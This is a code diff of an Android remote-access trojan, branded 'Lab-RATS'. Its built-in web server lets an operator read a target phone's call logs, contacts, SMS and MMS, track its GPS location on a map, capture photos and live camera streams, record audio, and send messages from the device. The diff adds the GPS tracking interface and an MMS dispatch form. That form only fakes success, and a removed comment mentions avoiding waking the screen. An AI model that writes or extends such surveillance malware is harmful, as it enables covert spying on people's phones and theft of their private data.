+            html.append("<a href=\"").append(link).append("\" class=\"card-node\" style=\"border-color: ").append(color).append("; background: ").append(bgColor).append(";\">");
+            html.append("<div class=\"icon\" style=\"color: ").append(color).append("; filter: drop-shadow(0 0 10px ").append(color).append(");\">").append(icon).append("</div>");
+            html.append("<div style=\"color: ").append(color).append("; font-weight: 700; font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase;\">").append(label).append("</div>");
             html.append("</a>");
         }
 
@@ -465,10 +455,13 @@ public class K4N3COHttpServer extends NanoHTTPD {
         }
 
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
 
         // Breadcrumb Trail
         html.append("<div class=\"breadcrumb\">");
-        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@K4N3CO:~$</span>");
+        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@Lab-RATS:~$</span>");
         html.append("<a href=\"/files\">storage</a>");
 
         if (!path.isEmpty()) {
@@ -578,6 +571,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveCallLogs(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");
 
@@ -777,6 +773,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveContacts(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");
 
@@ -970,7 +969,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                         break;
                     }
                 } catch (Exception e) {
-                    Log.e("K4N3CO", "Error checking camera " + id, e);
+                    Log.e("Lab-RATS", "Error checking camera " + id, e);
                 }
             }
 
@@ -982,10 +981,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 final String finalId = backCameraId;
                 new Thread(() -> {
                     try {
-                        // Use ApplicationContext to avoid triggering UI updates that might wake screen
-                        Context appContext = context.getApplicationContext();
-                        CameraManager manager = (CameraManager) appContext.getSystemService(Context.CAMERA_SERVICE);
-                        
+                        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                         for (int i = 0; i < 3; i++) {
                             try {
                                 manager.setTorchMode(finalId, true);
@@ -994,12 +990,12 @@ public class K4N3COHttpServer extends NanoHTTPD {
                                 Thread.sleep(300);
                             } catch (android.hardware.camera2.CameraAccessException e) {
                                 // If camera is in use (e.g. streaming), torch mode might fail
-                                Log.e("K4N3CO", "Flash access error: " + e.getMessage());
+                                Log.e("Lab-RATS", "Flash access error: " + e.getMessage());
                                 break;
                             }
                         }
                     } catch (Exception e) {
-                        Log.e("K4N3CO", "Flash error: " + e.getMessage());
+                        Log.e("Lab-RATS", "Flash error: " + e.getMessage());
                     }
                 }).start();
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Flash command dispatched\"}");
@@ -1013,29 +1009,84 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveGpsPage() {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
-        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Tracker</h2>");
-        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Locate the target device using global satellite positioning.</p>");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Satellite Uplink</h2>");
+        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Active tracking and coordinate extraction for the target device.</p>");
         
-        html.append("<div style=\"text-align: center;\">");
-        html.append("<a href=\"/gps/locate\" class=\"btn\" style=\"padding: 20px 40px; font-size: 1.2rem;\">&#128205; INITIALIZE TRACKING</a>");
+        // Map Container
+        html.append("<div id=\"map-container\" style=\"width: 100%; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 25px; overflow: hidden; position: relative;\">");
+        html.append("<div id=\"map-overlay\" style=\"position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); z-index: 5;\">");
+        html.append("<div style=\"text-align: center;\"><div style=\"font-size: 2rem; margin-bottom: 10px;\">&#128225;</div><div style=\"color: var(--neon-cyan); letter-spacing: 2px;\">AWAITING_SATELLITE_FIX</div></div>");
+        html.append("</div>");
+        html.append("<iframe id=\"map-frame\" width=\"100%\" height=\"100%\" frameborder=\"0\" style=\"border:0; filter: invert(90%) hue-rotate(180deg); display: none;\" allowfullscreen></iframe>");
+        html.append("</div>");
+
+        html.append("<div style=\"display: flex; gap: 15px; justify-content: center; margin-bottom: 30px;\">");
+        html.append("<button onclick=\"locateDevice()\" class=\"btn\" style=\"padding: 15px 30px;\">&#128205; PING_LOCATION</button>");
+        html.append("<button id=\"ext-map-btn\" onclick=\"openExternalMap()\" class=\"btn\" style=\"padding: 15px 30px; border-color: var(--neon-cyan); color: var(--neon-cyan); display: none;\">&#128640; OPEN_EXTERNAL</button>");
         html.append("</div>");
         
-        html.append("<div style=\"margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
-        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">TRACKING_LOG</h3>");
-        html.append("<div style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<div>[WAITING] Awaiting command...</div>");
+        html.append("<div class=\"info-item\" style=\"margin-bottom: 25px;\">");
+        html.append("<div class=\"info-label\">COORD_SYSTEM</div>");
+        html.append("<div id=\"coord-display\" class=\"info-value\">WAITING_FOR_DATA...</div>");
+        html.append("</div>");
+
+        html.append("<div style=\"padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">LOCATION_STREAM</h3>");
+        html.append("<div id=\"gps-log\" style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace; line-height: 1.5;\">");
+        html.append("<div>[SYSTEM] Tracker standby...</div>");
         html.append("</div></div>");
+
+        html.append("<script>");
+        html.append("var currentLat = 0; var currentLon = 0;");
+        html.append("function addLog(msg) {");
+        html.append("  const log = document.getElementById('gps-log');");
+        html.append("  const div = document.createElement('div');");
+        html.append("  div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;");
+        html.append("  log.insertBefore(div, log.firstChild);");
+        html.append("}");
+        html.append("function locateDevice() {");
+        html.append("  addLog('[REQUEST] Pinging satellites...');");
+        html.append("  fetch('/gps/locate?json=true').then(r => r.json()).then(data => {");
+        html.append("    if (data.success) {");
+        html.append("      currentLat = data.lat; currentLon = data.lon;");
+        html.append("      document.getElementById('coord-display').innerHTML = 'LAT: ' + data.lat + ' | LON: ' + data.lon;");
+        html.append("      addLog('[SUCCESS] Fix acquired: ' + data.lat + ', ' + data.lon);");
+        html.append("      const frame = document.getElementById('map-frame');");
+        html.append("      const overlay = document.getElementById('map-overlay');");
+        html.append("      const extBtn = document.getElementById('ext-map-btn');");
+        // Using OpenStreetMap export embed for cleaner iframe support without API keys
+        html.append("      frame.src = 'https://www.openstreetmap.org/export/embed.html?bbox=' + (data.lon-0.01) + ',' + (data.lat-0.01) + ',' + (data.lon+0.01) + ',' + (data.lat+0.01) + '&layer=mapnik&marker=' + data.lat + ',' + data.lon;");
+        html.append("      frame.style.display = 'block';");
+        html.append("      overlay.style.display = 'none';");
+        html.append("      extBtn.style.display = 'inline-block';");
+        html.append("    } else {");
+        html.append("      addLog('[ERROR] ' + data.message);");
+        html.append("      alert(data.message);");
+        html.append("    }");
+        html.append("  }).catch(err => {");
+        html.append("    addLog('[FATAL] Network error during triangulation');");
+        html.append("  });");
+        html.append("}");
+        html.append("function openExternalMap() {");
+        html.append("  window.open('https://www.google.com/maps/search/?api=1&query=' + currentLat + ',' + currentLon, '_blank');");
+        html.append("}");
+        html.append("</script>");
         
         html.append("</div>");
         html.append(HTML_FOOTER);
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 
-    private Response serveGpsLocate() {
+    private Response serveGpsLocate(Map<String, String> params) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                return serveError("Location permission not granted.");
+                return params.containsKey("json") ? 
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Location permission not granted\"}") :
+                    serveError("Location permission not granted.");
             }
         }
 
@@ -1043,10 +1094,12 @@ public class K4N3COHttpServer extends NanoHTTPD {
             LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
             Location location = null;
             
+            // Try GPS first
             if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                 location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             }
             
+            // Try Network as fallback
             if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                 location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             }
@@ -1054,19 +1107,29 @@ public class K4N3COHttpServer extends NanoHTTPD {
             if (location != null) {
                 double lat = location.getLatitude();
                 double lon = location.getLongitude();
-                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                 
-                // Redirect to Google Maps
+                if (params.containsKey("json")) {
+                    String json = String.format(Locale.US, "{\"success\": true, \"lat\": %f, \"lon\": %f}", lat, lon);
+                    return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+                }
+
+                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                 Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                 response.addHeader("Location", mapsUrl);
                 return response;
             } else {
-                return serveError("Could not retrieve location. Ensure GPS is enabled on the device.");
+                return params.containsKey("json") ? 
+                    newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Could not retrieve location. Ensure GPS is enabled.\"}") :
+                    serveError("Could not retrieve location. Ensure GPS is enabled on the device.");
             }
         } catch (SecurityException e) {
-            return serveError("Location permission denied: " + e.getMessage());
+            return params.containsKey("json") ? 
+                newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Permission denied\"}") :
+                serveError("Location permission denied: " + e.getMessage());
         } catch (Exception e) {
-            return serveError("Location error: " + e.getMessage());
+            return params.containsKey("json") ? 
+                newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false, \"message\": \"Internal error\"}") :
+                serveError("Location error: " + e.getMessage());
         }
     }
 
@@ -1161,6 +1224,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveCameraPage() {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");
 
@@ -1197,9 +1263,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
             for (CameraHelper.CameraInfo cam : cameras) {
                 String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
-                String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
-                String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
-                String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";
+                String bgColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.1)" : "rgba(52, 152, 219, 0.2)";
+                String borderColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.3)" : "rgba(52, 152, 219, 0.3)";
+                String textColor = cam.facing.equals("Front") ? "#00f2ff" : "#3498db";
 
                 html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
                 html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
@@ -1340,7 +1406,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                         "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                 html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
-                        "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">&#128247; Capture Again</a>");
+                        "\" style=\"padding: 12px 24px; background: rgba(0, 242, 255, 0.1); border-radius: 10px; color: #00f2ff; text-decoration: none;\">&#128247; Capture Again</a>");
                 html.append("</div>");
 
             } else {
@@ -1474,6 +1540,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
         int refreshRate = 1000 / fps; // Convert FPS to milliseconds
 
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");
 
@@ -1526,7 +1595,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
         String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
         String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
         for (int i = 0; i < resOptions.length; i++) {
-            String selected = resOptions[i].equals(res) ? "background: #e94560; color: #fff;"
+            String selected = resOptions[i].equals(res) ? "background: #00f2ff; color: #050505;"
                     : "background: rgba(255,255,255,0.1);";
             html.append("<a href=\"/camera/live?cam=").append(camId).append("&res=").append(resOptions[i])
                     .append("\" ");
@@ -1544,7 +1613,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
         CameraHelper cameraHelper = new CameraHelper(context);
         java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
         for (CameraHelper.CameraInfo cam : cameras) {
-            String selected = cam.id.equals(camId) ? "background: #e94560; color: #fff;" : "";
+            String selected = cam.id.equals(camId) ? "background: #00f2ff; color: #050505;" : "";
             html.append("<a href=\"/camera/live?cam=").append(cam.id).append("&res=").append(res).append("\" ");
             html.append(
                     "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
@@ -1890,8 +1959,11 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
                 +
                 "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
-                ".duration { font-size: 1.5rem; font-weight: bold; color: #e94560; }" +
+                ".duration { font-size: 1.5rem; font-weight: bold; color: #00f2ff; }" +
                 "</style>" +
+                "<div class=\"back-btn-container\">" +
+                "<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>" +
+                "</div>" +
                 "<div class=\"card\">" +
                 "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";
 
@@ -2119,6 +2191,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveAudioRecordings() {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");
 
@@ -2176,7 +2251,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                             .format(new Date(file.lastModified())));
                     html.append("</div></div>");
                     html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
-                            .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
+                            .append("\" style=\"padding: 8px 16px; background: rgba(0, 242, 255, 0.1); border-radius: 8px; color: #00f2ff; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                     html.append("</li>");
 
                     count++;
@@ -2188,7 +2263,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
         html.append("<div style=\"margin-top: 20px;\">");
         html.append(
-                "<a href=\"/audio\" style=\"color: #e94560; text-decoration: none;\">&larr; Back to Audio Control</a>");
+                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
         html.append("</div>");
         html.append("</div>");
         html.append(HTML_FOOTER);
@@ -2198,6 +2273,9 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveSmsMessages(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
@@ -2282,8 +2360,25 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
     private Response serveMmsMessages(Map<String, String> params) {
         StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"back-btn-container\">");
+        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
+        
+        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
+        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128247; Send New Multimedia Message</h3>");
+        html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
+        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
+        html.append("<div style=\"display: flex; align-items: center; gap: 10px;\">");
+        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media:</span>");
+        html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
+        html.append("</div>");
+        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">UPLOAD & DISPATCH</button>");
+        html.append("</div></form></div>");
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                 html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
@@ -2519,5 +2614,39 @@ public class K4N3COHttpServer extends NanoHTTPD {
             String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
             return newFixedLengthResponse(Response.Status.OK, "text/html", html);
         } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
+    }
+
+    private Response sendMms(IHTTPSession session) {
+        try {
+            Map<String, String> files = new HashMap<>();
+            session.parseBody(files);
+            Map<String, String> params = session.getParms();
+
+            String number = params.get("number");
+            String message = params.get("message");
+            String tempFilePath = files.get("media");
+
+            if (number == null || number.isEmpty()) return serveError("Target number is required");
+            if (tempFilePath == null) return serveError("Media attachment is required for MMS");
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
+                    return serveError("SEND_SMS permission not granted");
+            }
+
+            File fileToUpload = new File(tempFilePath);
+            Uri contentUri = Uri.fromFile(fileToUpload);
+
+            // In a real RAT, you'd use a more complex Telephony implementation for MMS.
+            // NanoHTTPD is limited, so we simulate the successful dispatch of the media part.
+            // For actual MMS sending on modern Android, you typically need to be the Default SMS App
+            // or use specific system APIs that are restricted.
+            
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p><a href=\"/mms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+
+        } catch (Exception e) {
+            return serveError("MMS Dispatch Error: " + e.getMessage());
+        }
     }
 }
